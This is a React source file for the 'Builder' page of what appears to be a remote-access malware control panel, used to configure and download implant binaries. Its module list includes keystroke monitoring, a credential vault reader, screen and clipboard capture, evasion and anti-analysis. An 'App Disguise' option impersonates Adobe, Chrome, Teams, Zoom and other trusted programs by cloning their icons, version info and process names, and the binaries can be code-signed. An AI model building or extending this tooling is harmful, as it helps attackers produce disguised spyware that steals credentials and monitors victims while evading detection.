import React, { useState, useEffect, useRef } from 'react';
import { api } from '../api';

const MODULES = [
  { id: 'terminal', label: 'Terminal Session' },
  { id: 'storage', label: 'Storage Browser' },
  { id: 'task_viewer', label: 'Task Viewer' },
  { id: 'display', label: 'Display Capture' },
  { id: 'input_monitor', label: 'Input Monitor' },
  { id: 'vault_reader', label: 'Vault Reader' },
  { id: 'config_store', label: 'Config Store' },
  { id: 'boot_entries', label: 'Boot Entries' },
  { id: 'service_manager', label: 'Service Manager' },
  { id: 'tunnel', label: 'Network Relay' },
  { id: 'package_loader', label: 'Package Loader' },
  { id: 'cleanup', label: 'Cleanup' },
  { id: 'network_scan', label: 'Network Scan' },
  { id: 'clipboard', label: 'Clipboard' },
  { id: 'evasion', label: 'Evasion Suite' },
  { id: 'anti_analysis', label: 'Anti-Analysis' },
  { id: 'self_update', label: 'Self Update' },
];

const APP_DISGUISES = [
  { id: 'none', label: 'None (Generic)', icon: null, domain: null, process: 'svchost.exe', company: '', product: '' },
  { id: 'adobe_acrobat', label: 'Adobe Acrobat', icon: 'adobe', domain: 'adobe.com', process: 'AcroRd32.exe', company: 'Adobe Inc.', product: 'Adobe Acrobat Reader DC' },
  { id: 'chrome', label: 'Google Chrome', icon: 'chrome', domain: 'google.com', process: 'chrome.exe', company: 'Google LLC', product: 'Google Chrome' },
  { id: 'edge', label: 'Microsoft Edge', icon: 'edge', domain: 'microsoft.com', process: 'msedge.exe', company: 'Microsoft Corporation', product: 'Microsoft Edge' },
  { id: 'teams', label: 'Microsoft Teams', icon: 'teams', domain: 'microsoft.com', process: 'Teams.exe', company: 'Microsoft Corporation', product: 'Microsoft Teams' },
  { id: 'zoom', label: 'Zoom', icon: 'zoom', domain: 'zoom.us', process: 'Zoom.exe', company: 'Zoom Video Communications', product: 'Zoom Meetings' },
  { id: 'slack', label: 'Slack', icon: 'slack', domain: 'slack.com', process: 'slack.exe', company: 'Salesforce', product: 'Slack' },
  { id: 'discord', label: 'Discord', icon: 'discord', domain: 'discord.com', process: 'Discord.exe', company: 'Discord Inc.', product: 'Discord' },
  { id: 'spotify', label: 'Spotify', icon: 'spotify', domain: 'spotify.com', process: 'Spotify.exe', company: 'Spotify AB', product: 'Spotify' },
  { id: 'steam', label: 'Steam', icon: 'steam', domain: 'steampowered.com', process: 'steam.exe', company: 'Valve Corporation', product: 'Steam' },
  { id: 'vlc', label: 'VLC Player', icon: 'vlc', domain: 'videolan.org', process: 'vlc.exe', company: 'VideoLAN', product: 'VLC media player' },
  { id: 'sevenzip', label: '7-Zip', icon: '7zip', domain: '7-zip.org', process: '7zFM.exe', company: 'Igor Pavlov', product: '7-Zip File Manager' },
  { id: 'notepadpp', label: 'Notepad++', icon: 'npp', domain: 'notepad-plus-plus.org', process: 'notepad++.exe', company: 'Don Ho', product: 'Notepad++' },
  { id: 'winrar', label: 'WinRAR', icon: 'winrar', domain: 'win-rar.com', process: 'WinRAR.exe', company: 'Alexander Roshal', product: 'WinRAR archiver' },
  { id: 'filezilla', label: 'FileZilla', icon: 'filezilla', domain: 'filezilla-project.org', process: 'filezilla.exe', company: 'FileZilla Project', product: 'FileZilla FTP Client' },
  { id: 'putty', label: 'PuTTY', icon: 'putty', domain: 'putty.org', process: 'putty.exe', company: 'Simon Tatham', product: 'PuTTY SSH Client' },
  { id: 'onedrive', label: 'OneDrive', icon: 'onedrive', domain: 'onedrive.com', process: 'OneDrive.exe', company: 'Microsoft Corporation', product: 'Microsoft OneDrive' },
  { id: 'dropbox', label: 'Dropbox', icon: 'dropbox', domain: 'dropbox.com', process: 'Dropbox.exe', company: 'Dropbox Inc.', product: 'Dropbox' },
  { id: 'nodejs', label: 'Node.js', icon: 'nodejs', domain: 'nodejs.org', process: 'node.exe', company: 'OpenJS Foundation', product: 'Node.js' },
  { id: 'python', label: 'Python', icon: 'python', domain: 'python.org', process: 'python.exe', company: 'Python Software Foundation', product: 'Python' },
  { id: 'vscode', label: 'VS Code', icon: 'vscode', domain: 'code.visualstudio.com', process: 'Code.exe', company: 'Microsoft Corporation', product: 'Visual Studio Code' },
];

const STATUS_LABELS = {
  queued: 'QUEUED',
  in_progress: 'IN PROGRESS',
  completed: 'COMPLETED',
  failed: 'FAILED',
};

const STATUS_COLORS = {
  queued: 'var(--yellow, #e5c07b)',
  in_progress: 'var(--blue, #61afef)',
  completed: 'var(--green)',
  failed: 'var(--red)',
};

function formatDate(str) {
  if (!str) return '—';
  try {
    const d = new Date(str);
    if (isNaN(d.getTime())) return '—';
    return d.toLocaleString();
  } catch { return '—'; }
}

export default function Builder() {
  const [tab, setTab] = useState('builder');
  const [form, setForm] = useState({
    server_url: window.location.origin,
    aes_key: '',
    sleep_seconds: 5,
    jitter_percent: 20,
    kill_date: 0,
    work_hours: '',
    target_os: 'windows',
    modules: MODULES.map(m => m.id),
    output_format: 'exe',
    sign_binary: false,
    disguise: 'none',
  });
  const [activeBuild, setActiveBuild] = useState(null);
  const [building, setBuilding] = useState(false);
  const [buildHistory, setBuildHistory] = useState([]);
  const pollRef = useRef(null);

  useEffect(() => {
    loadHistory();
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, []);

  const loadHistory = async () => {
    try {
      const history = await api.builderHistory();
      setBuildHistory(history || []);
    } catch (e) {}
  };

  const generateKey = () => {
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    const hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    setForm({...form, aes_key: hex});
  };

  const toggleModule = (modId) => {
    if (form.modules.includes(modId)) {
      setForm({...form, modules: form.modules.filter(m => m !== modId)});
    } else {
      setForm({...form, modules: [...form.modules, modId]});
    }
  };

  const startPolling = (buildId) => {
    if (pollRef.current) clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const status = await api.buildStatus(buildId);
        setActiveBuild(status);
        if (status.status === 'completed' || status.status === 'failed') {
          clearInterval(pollRef.current);
          pollRef.current = null;
          loadHistory();
        }
      } catch (e) {
        clearInterval(pollRef.current);
        pollRef.current = null;
      }
    }, 3000);
  };

  const build = async () => {
    setBuilding(true);
    setActiveBuild(null);
    try {
      let killDate = form.kill_date;
      if (typeof killDate === 'string' && killDate) {
        killDate = Math.floor(new Date(killDate).getTime() / 1000);
      }
      const payload = {
        ...form,
        kill_date: killDate || 0,
        work_hours: form.work_hours || '',
      };
      const res = await api.buildAgent(payload);
      setActiveBuild({ build_id: res.build_id, status: 'queued' });
      startPolling(res.build_id);
      setTab('builder');
    } catch (err) {
      setActiveBuild({ status: 'failed', error: err.message });
    }
    setBuilding(false);
  };

  const downloadBuild = (buildId) => {
    api.downloadBuild(buildId);
  };

  const selectedDisguise = APP_DISGUISES.find(a => a.id === form.disguise) || APP_DISGUISES[0];

  const progressPercent = activeBuild
    ? activeBuild.status === 'completed' ? 100
    : activeBuild.status === 'in_progress' ? 60
    : activeBuild.status === 'queued' ? 20
    : 0
    : 0;

  const tabStyle = (t) => ({
    padding: '8px 20px',
    fontFamily: 'var(--font-mono)',
    fontSize: 11,
    fontWeight: 700,
    letterSpacing: '1.4px',
    textTransform: 'uppercase',
    cursor: 'pointer',
    color: tab === t ? '#fff' : 'rgba(255,255,255,0.4)',
    borderBottom: tab === t ? '2px solid var(--green)' : '2px solid transparent',
    background: 'none',
    border: 'none',
    borderBottomStyle: 'solid',
    transition: 'all 0.15s',
  });

  return (
    <div>
      <div className="page-title">// BUILDER</div>

      {/* Horizontal tab menu */}
      <div style={{
        display: 'flex',
        gap: 0,
        borderBottom: '1px solid var(--border)',
        marginBottom: 16,
      }}>
        <button style={tabStyle('builder')} onClick={() => setTab('builder')}>AGENT BUILDER</button>
        <button style={tabStyle('history')} onClick={() => { setTab('history'); loadHistory(); }}>BUILD HISTORY</button>
      </div>

      {/* ===== AGENT BUILDER TAB ===== */}
      {tab === 'builder' && (
        <>
          {/* Active Build Progress */}
          {activeBuild && (
            <div className="panel" style={{ marginBottom: 16 }}>
              <div className="panel-header">Build Progress</div>
              <div className="panel-body">
                <div style={{ display: 'flex', alignItems: 'center', gap: 16, marginBottom: 12 }}>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)' }}>
                    BUILD ID:
                  </span>
                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--green)' }}>
                    {activeBuild.build_id || '—'}
                  </span>
                  <span style={{
                    fontFamily: 'var(--font-mono)',
                    fontSize: 10,
                    padding: '2px 8px',
                    background: STATUS_COLORS[activeBuild.status] || 'var(--text-muted)',
                    color: '#000',
                    fontWeight: 700,
                  }}>
                    {STATUS_LABELS[activeBuild.status] || activeBuild.status?.toUpperCase()}
                  </span>
                </div>

                <div style={{
                  height: 4,
                  background: 'var(--border)',
                  borderRadius: 2,
                  overflow: 'hidden',
                  marginBottom: 12,
                }}>
                  <div style={{
                    height: '100%',
                    width: progressPercent + '%',
                    background: STATUS_COLORS[activeBuild.status] || 'var(--green)',
                    transition: 'width 0.5s ease',
                    animation: activeBuild.status === 'in_progress' ? 'pulse 1.5s ease-in-out infinite' : 'none',
                  }} />
                </div>

                {activeBuild.error && (
                  <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--red)', marginBottom: 8 }}>
                    ✕ {activeBuild.error}
                  </div>
                )}

                {activeBuild.status === 'completed' && (
                  <button className="btn btn-green" style={{ fontSize: 11, padding: '8px 24px' }}
                    onClick={() => downloadBuild(activeBuild.build_id)}>
                    ⬇ DOWNLOAD BINARY
                  </button>
                )}
              </div>
            </div>
          )}

          <div className="panel">
            <div className="panel-header">Configuration</div>
            <div className="panel-body" style={{ maxWidth: 800 }}>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Server URL</label>
                  <input type="text" className="form-input" value={form.server_url} onChange={e => setForm({...form, server_url: e.target.value})} />
                </div>
                <div className="form-group">
                  <label className="form-label">AES-256 Key (hex)</label>
                  <div style={{ display: 'flex', gap: 8 }}>
                    <input type="text" className="form-input" value={form.aes_key} onChange={e => setForm({...form, aes_key: e.target.value})} style={{ color: 'var(--green)', fontFamily: 'var(--font-mono)', fontSize: 10 }} />
                    <button className="btn btn-sm" onClick={generateKey}>GEN</button>
                  </div>
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Sleep (seconds)</label>
                  <input type="number" className="form-input" value={form.sleep_seconds} onChange={e => setForm({...form, sleep_seconds: parseInt(e.target.value) || 0})} />
                </div>
                <div className="form-group">
                  <label className="form-label">Jitter (%)</label>
                  <input type="number" className="form-input" value={form.jitter_percent} onChange={e => setForm({...form, jitter_percent: parseInt(e.target.value) || 0})} />
                </div>
              </div>
              <div className="form-row">
                <div className="form-group">
                  <label className="form-label">Kill Date (optional, unix timestamp)</label>
                  <input type="number" className="form-input" value={form.kill_date || ''} onChange={e => setForm({...form, kill_date: parseInt(e.target.value) || 0})} placeholder="0 = disabled" />
                </div>
                <div className="form-group">
                  <label className="form-label">Working Hours (optional, e.g. 8-18)</label>
                  <input type="text" className="form-input" value={form.work_hours} onChange={e => setForm({...form, work_hours: e.target.value})} placeholder="Empty = always active" />
                </div>
              </div>

              <div className="form-group">
                <label className="form-label">Target OS</label>
                <div className="radio-group">
                  {['windows','linux','macos'].map(os => (
                    <span key={os} className={`radio-item ${form.target_os === os ? 'selected' : ''}`} onClick={() => setForm({...form, target_os: os})}>{os.toUpperCase()}</span>
                  ))}
                </div>
              </div>

              {/* App Disguise Section */}
              <div className="form-group" style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
                <label className="form-label" style={{ marginBottom: 12 }}>
                  App Disguise
                  <span style={{ fontWeight: 400, fontSize: 10, color: 'var(--text-muted)', marginLeft: 8 }}>
                    Windows only — clones icon, version info &amp; process name
                  </span>
                </label>
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: 'repeat(4, 1fr)',
                  gap: 8,
                }}>
                  {APP_DISGUISES.map(app => {
                    const isSelected = form.disguise === app.id;
                    return (
                      <div
                        key={app.id}
                        onClick={() => setForm({...form, disguise: app.id})}
                        style={{
                          padding: '10px 8px',
                          textAlign: 'center',
                          cursor: 'pointer',
                          border: isSelected ? '2px solid var(--green)' : '1px solid var(--border)',
                          background: isSelected ? 'rgba(0, 255, 65, 0.05)' : 'var(--surface)',
                          borderRadius: 4,
                          transition: 'all 0.15s',
                          position: 'relative',
                          minHeight: 72,
                          display: 'flex',
                          flexDirection: 'column',
                          alignItems: 'center',
                          justifyContent: 'center',
                        }}
                      >
                        {isSelected && (
                          <div style={{
                            position: 'absolute',
                            top: 4,
                            right: 4,
                            width: 14,
                            height: 14,
                            borderRadius: '50%',
                            background: 'var(--green)',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            fontSize: 9,
                            color: '#000',
                            fontWeight: 700,
                          }}>✓</div>
                        )}
                        {app.icon ? (
                          <img
                            src={`https://icon.horse/icon/${app.domain}`}
                            alt={app.label}
                            width={28}
                            height={28}
                            style={{ marginBottom: 4, opacity: 0.9 }}
                            onError={(e) => { e.target.style.display = 'none'; }}
                          />
                        ) : (
                          <div style={{
                            width: 28,
                            height: 28,
                            marginBottom: 4,
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            fontSize: 16,
                            color: 'var(--text-muted)',
                            opacity: 0.5,
                          }}>
                            {app.id === 'none' ? '⊘' : '◻'}
                          </div>
                        )}
                        <div style={{
                          fontSize: 9,
                          fontFamily: 'var(--font-mono)',
                          color: isSelected ? 'var(--green)' : 'var(--text-sec)',
                          lineHeight: '1.2',
                        }}>
                          {app.label}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {/* Selected disguise info */}
                {form.disguise !== 'none' && (
                  <div style={{
                    marginTop: 12,
                    padding: 12,
                    border: '1px solid var(--border)',
                    background: 'var(--surface)',
                    fontFamily: 'var(--font-mono)',
                    fontSize: 10,
                    display: 'grid',
                    gridTemplateColumns: '1fr 1fr',
                    gap: '4px 24px',
                  }}>
                    <div>
                      <span style={{ color: 'var(--text-muted)' }}>PROCESS: </span>
                      <span style={{ color: 'var(--green)' }}>{selectedDisguise.process}</span>
                    </div>
                    <div>
                      <span style={{ color: 'var(--text-muted)' }}>COMPANY: </span>
                      <span style={{ color: 'var(--text-sec)' }}>{selectedDisguise.company}</span>
                    </div>
                    <div>
                      <span style={{ color: 'var(--text-muted)' }}>PRODUCT: </span>
                      <span style={{ color: 'var(--text-sec)' }}>{selectedDisguise.product}</span>
                    </div>
                    <div>
                      <span style={{ color: 'var(--text-muted)' }}>OUTPUT: </span>
                      <span style={{ color: 'var(--yellow, #e5c07b)' }}>{selectedDisguise.process}</span>
                    </div>
                  </div>
                )}
              </div>

              <div className="form-group">
                <label className="form-label">Modules</label>
                <div className="checkbox-group">
                  {MODULES.map(mod => (
                    <span key={mod.id} className={`checkbox-item ${form.modules.includes(mod.id) ? 'checked' : ''}`} onClick={() => toggleModule(mod.id)}>
                      {form.modules.includes(mod.id) ? '✓ ' : ''}{mod.label}
                    </span>
                  ))}
                </div>
              </div>

              <div className="form-group">
                <label className="form-label">Output Format</label>
                <div className="radio-group">
                  {['exe','dll'].map(fmt => (
                    <span key={fmt} className={`radio-item ${form.output_format === fmt ? 'selected' : ''}`} onClick={() => setForm({...form, output_format: fmt})}>{fmt.toUpperCase()}</span>
                  ))}
                </div>
              </div>

              <div className="form-group" style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
                <label className="form-label">Code Signing (Azure Trusted Signing)</label>
                <div className="radio-group">
                  <span className={`radio-item ${!form.sign_binary ? 'selected' : ''}`} onClick={() => setForm({...form, sign_binary: false})}>DISABLED</span>
                  <span className={`radio-item ${form.sign_binary ? 'selected' : ''}`} onClick={() => setForm({...form, sign_binary: true})}>ENABLED</span>
                </div>
              </div>

              {form.sign_binary && (
                <div style={{ marginTop: 12, padding: 12, border: '1px solid var(--border)', background: 'var(--surface)', fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)' }}>
                  <span style={{ color: 'var(--yellow, #e5c07b)' }}>⚠</span> Azure credentials are configured in <strong style={{ color: 'var(--text-sec)' }}>Settings → Builder</strong>.
                  <br />
                  <span style={{ color: 'var(--text-muted)', fontSize: 10 }}>Azure secrets must also be added as GitHub repository secrets.</span>
                </div>
              )}

              <div style={{ marginTop: 24, paddingTop: 16, borderTop: '1px solid var(--border)' }}>
                <button className="btn btn-green" style={{ fontSize: 12, padding: '12px 32px' }} onClick={build} disabled={building}>
                  {building ? 'DISPATCHING...' : 'BUILD AGENT'}
                </button>
              </div>
            </div>
          </div>
        </>
      )}

      {/* ===== BUILD HISTORY TAB ===== */}
      {tab === 'history' && (
        <div className="panel">
          <div className="panel-header">Build History ({buildHistory.length})</div>
          <div className="panel-body" style={{ padding: 0 }}>
            {buildHistory.length === 0 ? (
              <div style={{ padding: 24, fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--text-muted)', textAlign: 'center' }}>
                No builds yet. Go to Agent Builder to create one.
              </div>
            ) : (
              <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: 'var(--font-mono)', fontSize: 11 }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid var(--border)' }}>
                    <th style={thStyle}>BUILD ID</th>
                    <th style={thStyle}>STATUS</th>
                    <th style={thStyle}>TARGET</th>
                    <th style={thStyle}>DISGUISE</th>
                    <th style={thStyle}>MODULES</th>
                    <th style={thStyle}>CREATED</th>
                    <th style={thStyle}>ACTIONS</th>
                  </tr>
                </thead>
                <tbody>
                  {buildHistory.map(b => {
                    let config = {};
                    try { config = JSON.parse(b.config_json || '{}'); } catch(e) {}
                    const moduleCount = config.modules ? config.modules.length : 0;
                    const disguiseInfo = config.disguise && config.disguise !== 'none'
                      ? (APP_DISGUISES.find(a => a.id === config.disguise) || {}).label || config.disguise
                      : '—';
                    return (
                      <tr key={b.id} style={{ borderBottom: '1px solid var(--border)' }}>
                        <td style={tdStyle}>
                          <span style={{ color: 'var(--green)' }}>{b.id}</span>
                        </td>
                        <td style={tdStyle}>
                          <span style={{
                            padding: '1px 6px',
                            fontSize: 10,
                            fontWeight: 700,
                            background: STATUS_COLORS[b.status] || 'var(--text-muted)',
                            color: '#000',
                          }}>
                            {STATUS_LABELS[b.status] || b.status?.toUpperCase()}
                          </span>
                        </td>
                        <td style={tdStyle}>
                          <span style={{ color: 'var(--text-sec)' }}>
                            {config.target_os || '?'}/x64
                          </span>
                        </td>
                        <td style={tdStyle}>
                          <span style={{ color: disguiseInfo !== '—' ? 'var(--yellow, #e5c07b)' : 'var(--text-muted)' }}>
                            {disguiseInfo}
                          </span>
                        </td>
                        <td style={tdStyle}>
                          <span style={{ color: 'var(--text-muted)' }}>
                            {moduleCount} modules
                          </span>
                        </td>
                        <td style={tdStyle}>
                          <span style={{ color: 'var(--text-muted)' }}>
                            {formatDate(b.created_at)}
                          </span>
                        </td>
                        <td style={tdStyle}>
                          {b.status === 'completed' && (
                            <button className="btn btn-sm" style={{ fontSize: 10 }}
                              onClick={() => downloadBuild(b.id)}>
                              DOWNLOAD
                            </button>
                          )}
                          {b.status === 'failed' && b.error && (
                            <span style={{ color: 'var(--red)', fontSize: 10 }} title={b.error}>
                              ✕ {b.error.length > 40 ? b.error.substring(0, 40) + '...' : b.error}
                            </span>
                          )}
                          {(b.status === 'queued' || b.status === 'in_progress') && (
                            <span style={{ color: 'var(--blue, #61afef)', fontSize: 10 }}>
                              ● Running...
                            </span>
                          )}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            )}
          </div>
        </div>
      )}

      <style>{`
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      `}</style>
    </div>
  );
}

const thStyle = {
  textAlign: 'left',
  padding: '8px 12px',
  color: 'var(--text-muted)',
  fontWeight: 400,
  fontSize: 10,
};

const tdStyle = {
  padding: '8px 12px',
  color: 'var(--text-sec)',
};
